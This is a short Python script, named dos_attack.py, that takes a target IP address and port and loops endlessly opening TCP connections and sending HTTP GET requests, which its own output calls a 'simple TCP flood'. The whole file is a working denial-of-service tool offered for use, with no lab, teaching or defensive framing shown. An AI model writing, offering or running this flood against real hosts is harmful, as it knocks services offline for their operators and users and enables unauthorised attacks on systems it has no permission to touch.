#!/usr/bin/env python3
import sys, socket, time
if len(sys.argv)!=3:
    print("Usage: dos_attack.py <target_ip> <target_port>")
    sys.exit(1)
tgt = sys.argv[1]
port = int(sys.argv[2])
print("Starting simple TCP flood to", tgt, port)
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        s.connect((tgt, port))
        s.send(b"GET / HTTP/1.1\r\nHost: victim\r\n\r\n")
        s.close()
    except Exception:
        pass
